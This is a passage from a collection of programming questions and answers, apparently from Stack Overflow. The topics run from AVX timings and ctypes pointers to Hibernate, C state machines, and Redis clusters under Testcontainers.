If you are able to get 1.33 cycle per 256 bits = 1/192 per bit = 0.33 cycle per QWord = 12x faster.
'It’s the Memory, Stupid!'
Obviously I've not added in loop overhead and load/stores to/from memory.
The loop overhead is tiny given proper alignment of jump targets, but the memory
access will easily be the biggest slowdown.
A single cache miss to main memory on Skylake can cost you more than 250 cycles1.
It is in clever management of memory that the major gains will be made.
The 12 times possible speed-up using AVX256 is small potatoes in comparison.
I'm not counting the set up of the shift counter in CL/(YMM3/YMM4) because I'm assuming you'll reuse that value over many iterations.
You're not going to beat that with AVX512 instructions, because consumer grade CPU's with AVX512 instructions are not yet available.
The only current processor that supports currently is Knights Landing.
) All these timings are best case values, and should be taken as indications, not as hard values.
1) Cost of cache miss in Skylake: 42 cycles + 52ns = 42 + (524.6Ghz) = 281 cycles.
",c
spring boot maven plugin  rename original jar,"When I build my project using the Spring Boot Maven Plugin I get two jar files: foo.jar and foo.jar.original. I understand that I can use fileName to call the repackaged one something else, but what I want to do is rename the original file. I want foo.jar (repackaged) and original-foo.jar (original) because I want it to be clear which one is the original, but I need the file to be .jar to work with a pipeline tool. How can I do this?
","The .original suffix is hard-coded in org.springframework.boot.loader.tools.Repackager.getBackupFile() method so you won't be able to replace it with a original- prefix unless you fork your own version of Spring Boot Maven Plugin:
/**
 * Return the {@link File} to use to backup the original source.
 * @return the file to use to backup the original source
 */
public final File getBackupFile() {
    return new File(this.source.getParentFile(), this.source.getName() + "".original"");
}

",java
why double ctypespointer object works for char while triple ctypespointer would make more sense,"I have a library my_lib with a C function that takes a char*** parameter, a pointer to an array of char* that is allocated by the function. Here is a minimal reproducible example of such a function:
void getArrayOfStrings(char*** paramPtr)
{
    (*paramPtr) = (char**) malloc(3*sizeof(char*));
    
    (*paramPtr)[0] = (char*) malloc(strlen(""Foo"")+1);
    strcpy((*paramPtr)[0], ""Foo"");
    
    (*paramPtr)[1] = (char*) malloc(strlen(""Bar"")+1);
    strcpy((*paramPtr)[1], ""Bar"");
    
    (*paramPtr)[2] = 0;
}

It sets the last array element to 0, so that caller can identify it (rather than providing the size as a second parameter). Note that a separate function is provided to free the memory.
I run ctypesgen to generate a Python binding to this function. It generates this code:
getArrayOfStrings = _lib.get(""getArrayOfStrings"", ""cdecl"")
getArrayOfStrings.argtypes = [POINTER(POINTER(POINTER(c_char)))]
getArrayOfStrings.restype = None

This generated binding can be called from the Python script below:
import my_lib

import ctypes
names = ctypes.POINTER(ctypes.POINTER(ctypes.c_char))()

my_lib.getArrayOfStrings(names)

if names:
    for name in names:
        name_str = my_lib.String(name)
        if name_str:
            print(""Got name: "" + str(name_str))
        else:
            break

It works just fine and prints ""Foo\nBar\n""
I'm just wondering why using ctypes.POINTER(ctypes.POINTER(ctypes.c_char)), that I understand as being a ""point to pointer to char"", so a char**, works. Why I should not be using a ctypes.POINTER(ctypes.POINTER(ctypes.POINTER(ctypes.c_char)))?
I tested with ctypes.POINTER(ctypes.POINTER(ctypes.POINTER(ctypes.c_char))), the same code produces the error:
my_lib.getArrayOfStrings(names)
OSError: exception: access violation writing 0x0000000000000000

","Because ctypes knows that the function takes char*** due to .argtypes being defined, passing a char** implies ctypes.byref (take the address of), which passes names as char***.  Here's a working example with an explicit byref and using your C code as a DLL:
import ctypes as ct

dll = ct.CDLL('./test')
getArrayOfStrings = dll.getArrayOfStrings
getArrayOfStrings.argtypes = ct.POINTER(ct.POINTER(ct.POINTER(ct.c_char))),
getArrayOfStrings.restype = None

names = ct.POINTER(ct.POINTER(ct.c_char))()
dll.getArrayOfStrings(ct.byref(names))
#dll.getArrayOfStrings(names)  # also works but byref implied here.
i = 0
while names[i]:
    print(ct.string_at(names[i]))
    i += 1

Output:
b'Foo'
b'Bar'

When names = ct.POINTER(ct.POINTER(ct.POINTER(ct.c_char)))() is used, ctypes does not have to add the implied byref and assumes you know what you are doing, but in this case the char*** is null.  Since it is being used as an output parameter, C tries to write to it and fails.
FYI, ctypes also has c_char_p which is a special handler for null-terminated byte strings (char*), so this works without the extra string extraction:
import ctypes as ct

dll = ct.CDLL('./test')
getArrayOfStrings = dll.getArrayOfStrings
getArrayOfStrings.argtypes = ct.POINTER(ct.POINTER(ct.c_char_p)),
getArrayOfStrings.restype = None

names = ct.POINTER(ct.c_char_p)()
dll.getArrayOfStrings(names)
i = 0
while names[i]:
    print(names[i])
    i += 1

(same output)
",c
assign to itself optimization or extraneous,"So I was going through the glimg section of the unofficial OpenGL library and came across something I found strange. In one of the functions a pointer parameter is being assigned to itself and I can't see how this could be accomplishing anything. Does this somehow force memory into cache or is it something else? Possibly a bug?
static uint8 *resample_row_generic(uint8 *out, uint8 *in_near, uint8 *in_far, int w, int hs)
{
   // resample with nearest-neighbor
   int i,j;
   in_far = in_far;  // <-- here?
   for (i=0; i < w; ++i)
      for (j=0; j < hs; ++j)
         out[i*hs+j] = in_near[i];
   return out;
}

","It's there to suppress the warning that the parameter in_far is not used in the function.
Another way to suppress the warning is:
(void)in_far;

",c
highprecision clock in python,"Is there a way to measure time with high-precision in Python --- more precise than one second?  I doubt that there is a cross-platform way of doing that; I'm interesting in high precision time on Unix, particularly Solaris running on a Sun SPARC machine.
timeit seems to be capable of high-precision time measurement, but rather than measure how long a code snippet takes, I'd like to directly access the time values. 
","The standard time.time() function provides sub-second precision, though that precision varies by platform. For Linux and Mac precision is +- 1 microsecond or 0.001 milliseconds. Python on Windows with Python < 3.7 uses +- 16 milliseconds precision due to clock implementation problems due to process interrupts. The timeit module can provide higher resolution if you're measuring execution time.
>>> import time
>>> time.time()        #return seconds from epoch
1261367718.971009      

Python 3.7 introduces new functions to the time module that provide higher resolution for longer time periods:
>>> import time
>>> time.time_ns()
1530228533161016309
>>> time.time_ns() / (10 ** 9) # convert to floating-point seconds
1530228544.0792289

",python
what is the best way of getting files from aws s3 inserting them into zip and uploading that zip to the bucket,"I'm trying to find efficient way of downloading files from s3, insert them into zip file, and after inserting those files into archive, upload it to the bucket. It should be efficient as archive could reach almost 10Gb.I tried to use one thread with Zip4J`s library ZipOutputStream that is created from PipedOutputStream for inserting files into zip and simultaneously using another thread for uploading that zip to the bucket. The problem is result zip is corrupted, and I'm not able to copy any file from that zip, here's my code:
Part that download and insert files into zip archive:
private Thread getDownloadAndZipThread(List<String> keys, String filename, ZipFile zip, ZipParameters parameters) {
        return new Thread(() -> {
            long start = System.currentTimeMillis();
            try (final ZipOutputStream zipOutputStream = new ZipOutputStream(pipedOutputStream)){
                keys.forEach(key -> {
                    //logger.log(""\nprocessing file: "" + key);
                    try {
                        parameters.setFileNameInZip(key);
                        zipOutputStream.putNextEntry(parameters);
                        pipedOutputStream.write(s3Service.getFile(key,               BUCKET_NAME).readAllBytes());  
                        zipOutputStream.closeEntry();
                        //zip.addStream(IOUtils.copy(s3Service.getFile(key, BUCKET_NAME),  pipedOutputStream), parameters);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                });
            } catch (Exception e) {
                logger.log(""\nZipService - getDownloadAndZipThread - error: "" + e);
            }
            long executedTime = System.currentTimeMillis() - start;
            logger.log(""\nZipService - getDownloadAndZipThread - execution time: "" + executedTime);
        });
    }

Part that upload zip to the bucket:
private Thread getS3Out(String filename) {
    return new Thread(() -> {
        long start = System.currentTimeMillis();
        try {
            s3Service.multipartUpload(filename, BUCKET_NAME, pipedInputStream);
            pipedInputStream.close();
        } catch (final Exception all) {
            logger.log(""\nFailed to process outputStream due to error: "" + all + ""\n"");
            System.exit(-3);
        }
        long executedTime = System.currentTimeMillis() - start;
        logger.log(""\nZipService - getS3Out - execution time: "" + executedTime);
        });
}

Part that call these threads:
String filename = generateZipName();
 ZipFile zip = new ZipFile(filename);

        
 ZipParameters parameters = new ZipParameters();
 parameters.setCompressionLevel(CompressionLevel.FASTEST);

 final Thread downloadAndZip = getDownloadAndZipThread(keys, filename, zip, parameters); 
 final Thread upload = getS3Out(filename);

 downloadAndZip.start();
 upload.start();
 try {
      downloadAndZip.join();
      upload.join();
     } catch (InterruptedException e) {
      logger.log(""ZipService - failed to join thread due to error: "" + e);
      throw new RuntimeException(e);
    }

I tried using built-in Java ZipOutput stream, but it works too slow and as I need to use this code in AWS lambda it should be better. It take 130 seconds to download - insert into zip - upload to the bucket.
Zip4J ZipOutputStream instead takes 80 seconds in with the same cycle.
Both variants was tested on 16 files with total size 1.6Gb.
I need to somehow fix issue with corrupted zip file for Zip4j case.
","I want to post here a solution that I found back then, when the question was actual:
public class ZipServiceImpl implements ZipService {

private final Logger LOGGER = LoggerFactory.getLogger(ZipServiceImpl.class);

@Autowired
private AmazonS3ServiceImpl s3Service;

/**
 * Method for simultaneous downloading files
 * from the S3 bucket, generating a zip and
 * uploading that zip into bucket
 *
 * @param keys
 */
@Override
public void createZip(Map<String, String> keys, String zipName) {
    final PipedOutputStream pipedOutputStream = new PipedOutputStream();
    final PipedInputStream pipedInputStream;
    try {
        pipedInputStream = new PipedInputStream(pipedOutputStream);
    } catch (IOException e) {
        LOGGER.error(""ZipServiceImpl - createZip - failed to create input stream"");
        throw new RuntimeException(e);
    }

    final Thread downloadAndZip = getDownloadAndZipThread(keys, pipedOutputStream);
    final Thread upload = getUploadThread(zipName, pipedInputStream);

    downloadAndZip.start();
    upload.start();

    try {
        downloadAndZip.join();
        upload.join();
    } catch (InterruptedException e) {
        LOGGER.error(""ZipService - failed to join thread due to error: "" + e);
        throw new RuntimeException(e);
    }
}

private Thread getDownloadAndZipThread(Map<String, String> keys, PipedOutputStream pipedOutputStream) {
    return new Thread(() -> {
        long start = System.currentTimeMillis();
        try (final ZipArchiveOutputStream zipOutputStream = new ZipArchiveOutputStream(pipedOutputStream)) {
            for (Map.Entry<String, String> entry : keys.entrySet()) {
                try {
                    downloadAndZip(zipOutputStream, entry.getKey(), entry.getValue());
                } catch (Exception e) {
                    LOGGER.error(""ZipServiceImpl - getDownloadAndZipThread - failed to download file: "" + entry.getKey());
                }
            }
        } catch (Exception e) {
            LOGGER.error(""ZipService - getDownloadAndZipThread - Failed to process inputStream due to error: "" + e);
            throw new RuntimeException(e);
        }
        long executedTime = System.currentTimeMillis() - start;
        LOGGER.info(""ZipService - getDownloadAndZipThread - execution time: "" + executedTime);
    });
}

/**
 * Instantiating of thread for uploading file into bucket
 *
 * @param filename
 * @return
 */
private Thread getUploadThread(String filename, PipedInputStream pipedInputStream) {
    return new Thread(() -> {
        long start = System.currentTimeMillis();
        try {
            s3Service.multipartUpload(filename, pipedInputStream);
            pipedInputStream.close();
        } catch (Exception e) {
            LOGGER.error(""Failed to process outputStream due to error: "" + e);
            throw new RuntimeException(e);
        }
        long executedTime = System.currentTimeMillis() - start;
        LOGGER.info(""ZipService - getUploadThread - execution time: "" + executedTime);
    });
}

/**
 * @param zipOutputStream -
 * @param awsKey          - name of the file that should be downloaded
 */
private void downloadAndZip(ZipArchiveOutputStream zipOutputStream, String awsKey, String destName) {

    if (!s3Service.existsAssetByName(awsKey)) {
        String error = ""ZipService - downloadAndZip - file with following aws key does not exist: "" + awsKey;
        LOGGER.error(error);
        throw new RuntimeException(error);
    }

    ZipArchiveEntry entry = new ZipArchiveEntry(destName);

    try (InputStream inputStream = s3Service.getAssetByName(awsKey)) {

        zipOutputStream.putArchiveEntry(entry);

        byte[] buffer = new byte[1024];
        int len;
        while ((len = inputStream.read(buffer)) > 0) {
            zipOutputStream.write(buffer, 0, len);
        }

        zipOutputStream.closeArchiveEntry();

    } catch (Exception e) {
        LOGGER.error(""ZipService - downloadAndZip - failed processing of: "" + awsKey + "" due to error: "" + e);
        throw new RuntimeException(e);
    }
}
}

",java
unexpected unresolved attribute reference 39all39 for class 39bool39,"When I do a matrix multiplication with numpy (Python 3.12.1, numpy 1.26.4, PyCharm 2024.3.1 (Professional Edition)), I get this warning which I believe is wrong:

Unresolved attribute reference 'all' for class 'bool'

Proof:

Minimial Reproducible Example
import numpy as np

a_matrix = np.array([[1, 2], [3, 4]])
b_matrix = np.array([[10], [20]])
a = [5.0]
b = [2.0]

if ((a_matrix @ np.array([[round(a[0], 0)], [round(b[0], 0)]])) == b_matrix).all():
    print(""Success"")

","The issue is with the == operator. It appears the numpy class definition in the numpy library specifies that it returns a typing.Any with a type hint, so pycharm assumes it was the usual return type of builtins.bool.
Here is the line from the numpy library that pycharm is using, copied for context and posterity and abbreviated to the key components for brevity:
class _ArrayOrScalarCommon:
    ...
    def __eq__(self, other: Any, /) -> Any: ...
    ...
class ndarray(_ArrayOrScalarCommon, Generic[_ShapeT_co, _DType_co]):
    ...

I confirmed that the typing.Any hint causes this issue by creating a custom class and seeing what the return type hint suggested and it matched exactly. This code runs without errors for the same reason yours does, it returns a numpy.ndarray which supports the .all method.
from typing import Any
import numpy


class A:
    def __eq__(self, other) -> Any:
        return numpy.array([])


a = A()
(a == a).all()


Rearranging doesn't remove the issue, but makes the issue more obvious for the next person to come along and check your code with a static type checker by very clearly indicating what you expect the return type of that operation to be.
from typing import Any
import numpy


class A:
    def __eq__(self, other) -> Any:
        return numpy.array([])


a = A()
equal_result: numpy.ndarray = a == a
equal_result.all()


Whether you consider this to be a pycharm error by assuming that a return type of typing.Any is a builtins.bool or if it is a numpy error by type hinting typing.Any on a == between two numpy.ndarray error is up to you.
This has been discussed in the numpy community before, here is what appears to be the main discussion on the topic.
",python
different representation for signed integer on the same platform,"Is there something in the C standard that implies only one representation for signed integers should be used? Specifically, does the standard prohibit using, for example, one's complement for int variables and two's complement for long int variables on the same machine?
If this is related to the hardware rather than the compiler,
is there any hardware that allows the existence of two different representations for signed integers on the same machine?
","Versions of the C standard prior to 2024 did not specify that different signed integer types had to use the same choice of two’s complement, one’s complement, or sign-and-magnitude.
C 2024 specifies that signed integer types use two’s complement.
",c
httpclient exception javalangillegalargumentexception host parameter is null,"I have next code
    URL targetUrl = ...
    HttpClient client = new HttpClient(connectionManager);
    GetMethod getMethod = new GetMethod();
    getMethod.setPath(targetUrl.getPath());

    HostConfiguration hostConfiguration = getConfiguration(targetUrl) //unknown lib code

    client.executeMethod(hostConfiguration, getMethod);

In some cases(on some hosts) I get 
java.lang.IllegalArgumentException: host parameter is null""
on client.executeMethod call.
Why may this happen?
","This is a write exampe of proxy
http://svn.apache.org/viewvc/httpcomponents/oac.hc3x/trunk/src/examples/ProxyTunnelDemo.java?view=co
In my case problem was in hostConfiguration creation
",java
is there a typical state machine implementation pattern,"We need to implement a simple state machine in C.
Is a standard switch statement the best way to go?
We have a current state (state) and a trigger for the transition.

switch(state)
{
  case STATE_1:
     state = DoState1(transition);
     break;
  case STATE_2:
     state = DoState2(transition);
     break;
}
...
DoState2(int transition)
{
   // Do State Work
   ...
   if(transition == FROM_STATE_2) {
     // New state when doing STATE 2 -> STATE 2
   }
   if(transition == FROM_STATE_1) {
    // New State when moving STATE 1 -> STATE 2
   }
   return new_state;
}

Is there a better way for simple state machines
EDIT:
  For C++, I think the Boost Statechart library might be the way to go.  However, it does not help with C.  Lets concentrate on the C use case.
","I prefer to use a table driven approach for most state machines:
typedef enum { STATE_INITIAL, STATE_FOO, STATE_BAR, NUM_STATES } state_t;
typedef struct instance_data instance_data_t;
typedef state_t state_func_t( instance_data_t *data );

state_t do_state_initial( instance_data_t *data );
state_t do_state_foo( instance_data_t *data );
state_t do_state_bar( instance_data_t *data );

state_func_t* const state_table[ NUM_STATES ] = {
    do_state_initial, do_state_foo, do_state_bar
};

state_t run_state( state_t cur_state, instance_data_t *data ) {
    return state_table[ cur_state ]( data );
};

int main( void ) {
    state_t cur_state = STATE_INITIAL;
    instance_data_t data;

    while ( 1 ) {
        cur_state = run_state( cur_state, &data );

        // do other program logic, run other state machines, etc
    }
}

This can of course be extended to support multiple state machines, etc. Transition actions can be accommodated as well:
typedef void transition_func_t( instance_data_t *data );

void do_initial_to_foo( instance_data_t *data );
void do_foo_to_bar( instance_data_t *data );
void do_bar_to_initial( instance_data_t *data );
void do_bar_to_foo( instance_data_t *data );
void do_bar_to_bar( instance_data_t *data );

transition_func_t * const transition_table[ NUM_STATES ][ NUM_STATES ] = {
    { NULL,              do_initial_to_foo, NULL },
    { NULL,              NULL,              do_foo_to_bar },
    { do_bar_to_initial, do_bar_to_foo,     do_bar_to_bar }
};

state_t run_state( state_t cur_state, instance_data_t *data ) {
    state_t new_state = state_table[ cur_state ]( data );
    transition_func_t *transition =
               transition_table[ cur_state ][ new_state ];

    if ( transition ) {
        transition( data );
    }

    return new_state;
};

The table driven approach is easier to maintain and extend and simpler to map to state diagrams.
",c
check if multiple variables have the same value,"I have a set of three variables x, y, z and I want to check if they all share the same value. In my case, the value will either be 1 or 0, but I only need to know if they are all the same. Currently I'm using
if 1 == x and  1 == y and 1 == z: 
    sameness = True

Looking for the answer I've found:
if 1 in {x, y, z}:

However, this operates as
if 1 == x or  1 == y or 1 == z: 
    atleastOneMatch = True

Is it possible to check if 1 is in each: x, y, and z?
Better yet, is there a more concise way of checking simply if x, y, and z are the same value?
(If it matters, I use Python 3.)
","If you have an arbitrary sequence, use the all() function with a generator expression:
values = [x, y, z]  # can contain any number of values
if all(v == 1 for v in values):

otherwise, just use == on all three variables:
if x == y == z == 1:

If you only needed to know if they are all the same value (regardless of what value that is), use:
if all(v == values[0] for v in values):

or
if x == y == z:

",python
lightweight c but no c compiler,"I'm helping out my friend with a project and I'm decent C++ programmer, but they need program done in C. As far as I saw, when you open project in Visual Studio/Netbeans it says C/C++. C++ part is bad because I want compiler to say ""i don't get it"" if I write
class SumStuff {
    ...

I'm very used to C++ and I may write something that my friend's lecturer might say ""this is not a valid C construct""
Any good/lightweight windows compilers?
","I'd say:
http://bellard.org/tcc/
http://en.wikipedia.org/wiki/Tiny_C_Compiler
It can also work as an interpreter.
",c
converting xml to json using python,"I've seen a fair share of ungainly XML->JSON code on the web, and having interacted with Stack's users for a bit, I'm convinced that this crowd can help more than the first few pages of Google results can.
So, we're parsing a weather feed, and we need to populate weather widgets on a multitude of web sites.  We're looking now into Python-based solutions.
This public weather.com RSS feed is a good example of what we'd be parsing (our actual weather.com feed contains additional information because of a partnership w/them).
In a nutshell, how should we convert XML to JSON using Python?
","There is no ""one-to-one"" mapping between XML and JSON, so converting one to the other necessarily requires some understanding of what you want to do with the results.
That being said, Python's standard library has several modules for parsing XML (including DOM, SAX, and ElementTree).  As of Python 2.6, support for converting Python data structures to and from JSON is included in the json module.
So the infrastructure is there.
",python
hibernate native query  invalid column name error sql17006,"package com.abc.def.model;

import javax.persistence.Column;
import javax.persistence.Id;
import javax.persistence.Entity;
import javax.persistence.Embeddable;
import javax.persistence.IdClass;
import java.util.Date;
import java.io.Serializable;



@NamedNativeQuery(name=""getMetadata"",query=""
                  select a.name alias1,a.fullname alias2,
                         b.name alias3,b.age alias4,
                         c.height alias5,c.something alias6,
                         d.otherthing alias7
                  from lame_table_name a,
                       lame_table_name_2 b
                  where a.id = b.id
                     and b.id = c.id 
                     and c.id = d.id 
                     and d.id = :namedparameter
                  order by a.index,b.index
               "",
            resultClass=MetadataModel.class)


  @Entity
  @IdClass(SomeIdClass.class)

  public class MetadataModel{

  @Id @Column(""alias1"")
  private Type alias1property;

  @Id @Column(""alias2"")
  private Type2 alias2property;

  @Column(""alias3"")
  private Type3 alias3property;

  //getters and setters
  }

  @Embeddable
  class SomeIdClass implements Serializable{

  //serialVersionUID line

  @Id @Column(""alias1"")
  private Type alias1property;

  @Id @Column(""alias2"")
  private Type2 alias2property;

  //getter and setters
  }

The error is SQL-17006, Invalid Column Name, have been trying out variations of this setup the whole day
Should I try putting Column(""lame_table_name.name"")
I also tried using SqlResultSetMapping (and removed @Column from fields of POJO) (and specifying all the column aliases in the columns attribute of SqlResultSetMapping) (are we supposed to specify the resultsetmapping again when executing the query via the setResultSetMapping method of the SQLQuery interface?)
package com.abc.def.model;

import javax.persistence.Column;
import javax.persistence.Id;
import javax.persistence.Entity;
import javax.persistence.Embeddable;
import javax.persistence.IdClass;
import java.util.Date;
import java.io.Serializable;
//other imports for the SqlResultSetMapping



@NamedNativeQuery(name=""getMetadata"",query=""
                  select a.name alias1,a.fullname alias2,
                         b.name alias3,b.age alias4,
                         c.height alias5,c.something alias6,
                         d.otherthing alias7
                  from lame_table_name a,
                       lame_table_name_2 b
                  where a.id = b.id
                     and b.id = c.id 
                     and c.id = d.id 
                     and d.id = :namedparameter
                  order by a.index,b.index
               "",
            resultSetMapping=""metaDataMapping"")


@SqlResultSetMapping(name=""metaDataMapping"",
              entities=@EntityResult(entityClass=MetadataModel.class,
                fields = {@FieldResult(name=""alias1Property"",column=""alias1"")
                           //so on
                      }

                 )
            )

  @Entity
  @IdClass(SomeIdClass.class)

  public class MetadataModel{


  private Type alias1property;


  private Type2 alias2property;


  private Type3 alias3property;

  //getters and setters
  }

  //composite class, exactly as above

","Well, earlier I was trying to specify both the columns and entities attributes in the resultsetmapping, so I tried removing the entity mappings, keeping the columns attribute, and calling the aliastobean result transformer, that plus writing setters to accept BigDecimal instead of Long (since its an Oracle DB), solved the issue...
",java
where should we use commitsession in try or finally,"If I want to use commit(session) after successful execution of database operation, where its better to put it in try or in finally block ?
Here I used it in finally, should it be in try ?
public void delete( --- ) {
    Session session = init();
    try {
        ----
    } catch (HibernateException e) {
        rollback(session);
        logger.error(""delete failed"", e);
        throw e;
    } finally {
        commit(session);
        close(session);
    }
}

","It should be in try, for two reasons:

You'll commit the session if some exception or error other than a HibernateException, and you almost certainly don't want to do that
You'll call commit after calling rollback. I can't remember whether Hibernate allows you to do that (by silently ignoring the rollback) but at the very least it's ugly. Every session should either be committed or rolled back.

The normal solution here is to keep a separate boolean variable which is set when you've successfully commit, and check that in finally, rolling back if necessary:
boolean committed = false;
try {
    // Do stuff
    commit(session);
    committed = true;
} catch (HibernateException e) {
    logger.error(""delete failed"", e);
    throw e;
} finally {
    if (!committed) {
        rollback(session);
    }
    // TODO: This won't execute if rollback fails.
    // Check whether that's a problem.
    close(session);
}

",java
jvm version manager,"Is there Ruby Version Manager equivalent for the Java world?
I'm looking for tool which allow me to easily download and install a new JVMs and switch between them. For example:
jvm install <version>
jvm list //will list installed JVMs on my system
jvm use jdk1.6 //will switch my env to jdk 1.6 version, etc.

","If you use Ubuntu you can specify which JVM you want to use via command (works only for JVM installed from apt-get or aptitude)
sudo update-alternatives --config java
Or by setting JAVA_HOME. Here is good tutorial:
http://vietpad.sourceforge.net/javaonlinux.html
",java
insert a string at a specific index,"How can I insert a string at a specific index of another string? 
 var txt1 = ""foo baz""

Suppose I want to insert ""bar "" after the ""foo"" how can I achieve that?
I thought of substring(), but there must be a simpler more straight forward way.
","You could prototype your own splice() into String.
Polyfill
if (!String.prototype.splice) {
    /**
     * {JSDoc}
     *
     * The splice() method changes the content of a string by removing a range of
     * characters and/or adding new characters.
     *
     * @this {String}
     * @param {number} start Index at which to start changing the string.
     * @param {number} delCount An integer indicating the number of old chars to remove.
     * @param {string} newSubStr The String that is spliced in.
     * @return {string} A new string with the spliced substring.
     */
    String.prototype.splice = function(start, delCount, newSubStr) {
        return this.slice(0, start) + newSubStr + this.slice(start + Math.abs(delCount));
    };
}

Example


String.prototype.splice = function(idx, rem, str) {_x000D_
    return this.slice(0, idx) + str + this.slice(idx + Math.abs(rem));_x000D_
};_x000D_
_x000D_
var result = ""foo baz"".splice(4, 0, ""bar "");_x000D_
_x000D_
document.body.innerHTML = result; // ""foo bar baz""




EDIT: Modified it to ensure that rem is an absolute value.
",javascript
how to bring up redis cluster using testcontainers in java,"I'm trying to create a Redis cluster using TestContainers to test my application, which depends on a Redis cluster. Here's what I have tried so far:
Code snippet for starting container:
Network network = Network.newNetwork();
RedisContainer redisContainer = new RedisContainer(DockerImageName.parse(""redis:7.0.5""))
                    .withExposedPorts(port)
                    .withCommand(""redis-server --port "" + port +
                            "" --requirepass "" + redisPassword +  // Password for clients
                            "" --masterauth "" + redisPassword +  // Password for inter-node communication
                            "" --cluster-enabled yes"" +
                            "" --cluster-config-file nodes.conf""+
                            "" --cluster-node-timeout 5000""+
                            "" --appendonly yes"" +
                            "" --bind 0.0.0.0"" )
                    .withNetwork(network)
                    .withNetworkMode(""bridge"")
                    .withNetworkAliases(""redis-"" + i)
                    .waitingFor(Wait.forListeningPort());

1. Single-Node Cluster
I attempted to create a single-node cluster with cluster-enabled set to yes and replica set to 0. I tried connecting to it using JedisCluster.
Issues and Fixes:
Initially, I got the error: Cluster slots not allocated. I resolved this by running the CLUSTER ADDSLOTS command to allocate the slot range.
After this, I ran the CLUSTER NODES command and got the following output:
1f2673c5fdb45ca16d564658ff88f815db5cbf01 172.29.0.2:6379@16379 myself,master - 0 0 1 connected 0-16383

However, when I tried connecting to the cluster using JedisCluster, connection got established, I was able to get nodes list with ip and port using jedisCluster.getClusterNodes() api. When I tried writing some key value pair got below error after few seconds.
redis.clients.jedis.exceptions.JedisClusterOperationException: Cluster retry deadline exceeded.
Oddly enough, running commands via redis-cli worked perfectly for both writing and reading data.
Cluster Info Output:
cluster_state:ok
cluster_slots_assigned:16384
cluster_slots_ok:16384
cluster_slots_pfail:0
cluster_slots_fail:0
cluster_known_nodes:1
cluster_size:1
cluster_current_epoch:1
cluster_my_epoch:1
cluster_stats_messages_pong_sent:1
cluster_stats_messages_meet_sent:1
cluster_stats_messages_sent:2
cluster_stats_messages_pong_received:1
cluster_stats_messages_meet_received:1
cluster_stats_messages_received:2
total_cluster_links_buffer_limit_exceeded:0

Cluster Slots Output:
1) 1) (integer) 0
   2) (integer) 16383
   3) 1) ""172.29.0.2""
      2) (integer) 6379
      3) ""b47f7da9be31ce953d4b4fbf9e3a737d1c9b7a58""
      4) (empty array)

2. Multi-Node Cluster
I also tried setting up a 6-node cluster (3 masters and 3 slaves).
Observations:
JedisCluster.getClusterNodes() returned the correct node information for all 3 master nodes (IP and port).
However, when I tried writing data to the cluster using JedisCluster, I got the following error:
redis.clients.jedis.exceptions.JedisClusterOperationException: Cluster retry deadline exceeded.

When I used redis-cli -c to write data, it got stuck at the Redirecting to slot [<some slot>] located at <ip> node message.
Possible Issue
I'm trying to bring up redis in a container using TestContainer module. I suspect the nodes in the cluster are unable to communicate with each other properly. In the case of the single-node cluster, some configuration might still be missing. Some
Any help in resolving this issue would be greatly appreciated. Thanks!
Edit:
JedisCluster Config code:
// Using redisContainer in above code snippet start the container and run  <redis-cli --no-auth-warning -h localhost -p 6379 -a password cluster addslotsrange 0 16383> to add slots and continue with below code

        GenericObjectPoolConfig poolConfig = new GenericObjectPoolConfig();
        poolConfig.setMaxTotal(Runtime.getRuntime().availableProcessors()); 
        poolConfig.setMaxIdle(Runtime.getRuntime().availableProcessors());
        poolConfig.setMinIdle(Runtime.getRuntime().availableProcessors());
        poolConfig.setMaxWaitMillis(2000);

//        Connect to the cluster using Jedis with a password
        DefaultJedisClientConfig.Builder jedisClientConfig = DefaultJedisClientConfig.builder()
                .password(redisPassword)
                .ssl(false)
                .connectionTimeoutMillis(10000)
                .socketTimeoutMillis(4000);

        final Set<HostAndPort> hosts = new HashSet<>(redisContainers.size());
        int i = 0;
        for(RedisContainer redisContainer : redisContainers){
            String redisHost = ""127.0.0.1"";
            int redisPort = redisContainer.getMappedPort(basePort+i);
            hosts.add(new HostAndPort(redisHost, redisPort));
            i += 1;
        }

        System.out.println(""Hosts "" + hosts);

        try (JedisCluster jedis = new JedisCluster(hosts, jedisClientConfig.build(), 3, poolConfig)) {
            Map<String, redis.clients.jedis.ConnectionPool> nodes = jedis.getClusterNodes();
            System.out.println(""Connected cluster nodes: "" + nodes);
            nodes.forEach((key, value) -> System.out.println(key));
            jedis.set(""key"", ""value""); // This is where the error is seen
            System.out.println(""Key set in Redis Cluster: "" + jedis.get(""key""));
        }
    ```

","In regards to ""Single-Node Cluster"":
The problem arises because .withExposedPorts(port) exposes the Redis service on a dynamically allocated local port. Meanwhile, the JedisCluster client uses the seed nodes (provided hosts) to resolve the cluster topology via the CLUSTER SLOTS or CLUSTER NODES command.  Then, it will use host/port announced by the nodes themself to create connections to a particular node.
As you can see from the output you have provided cluster nodes will announce the actual port they are running on (6379) unless cluster-announce-port is specified.
1f2673c5fdb45ca16d564658ff88f815db5cbf01 172.29.0.2:6379@16379 myself,master ...

Since port 6379 is not accessible outside the docker container (e.g., the test container exposes it on a different dynamically mapped port), call to jedis.set(""key"", ""value""); will try to acquire connection to the node using the announced host/port and will fail.
You can overcome this by using statically mapped port bindin or use Jedis provided option for host/port mapping -DefaultJedisClientConfig.Builder#hostAndPortMapper.
Option 1: Expose redis service on predefined port
int externalPort = 7379;
int port = 6379;
Network network = Network.newNetwork();
RedisContainer redisContainer = new RedisContainer(DockerImageName.parse(""redis:7.0.5""))
    // Use static port binding together with  cluster-announce-port
    .withCreateContainerCmdModifier(cmd -> cmd.withPortBindings(
        new PortBinding(Ports.Binding.bindPort(externalPort), ExposedPort.tcp(port))))
    .withCommand(""redis-server --port "" + port +
        "" --requirepass "" + redisPassword +  // Password for clients
        "" --masterauth "" + redisPassword +  // Password for inter-node communication
        "" --cluster-announce-port "" + externalPort +
        "" --cluster-enabled yes"" +
        "" --cluster-config-file nodes.conf""+
        "" --cluster-node-timeout 5000""+
        "" --appendonly yes"" +
        "" --bind 0.0.0.0"" )
    .withNetwork(network)
    .withNetworkMode(""bridge"")
    .withNetworkAliases(""redis-"" + i)
    .waitingFor(Wait.forListeningPort());

Option 2 : Use Jedis hostAndPortMapper
HostAndPortMapper nat = hostAndPort -> {
  if (hostAndPort.getPort() == port) {
    return new HostAndPort(redisContainer.getHost(), redisContainer.getMappedPort(port));
  }
  return hostAndPort;
};
...
//        Connect to the cluster using Jedis with a password
DefaultJedisClientConfig.Builder jedisClientConfig = DefaultJedisClientConfig.builder()
    .password(redisPassword)
    .hostAndPortMapper(nat)
    .ssl(false)
    .connectionTimeoutMillis(10000)
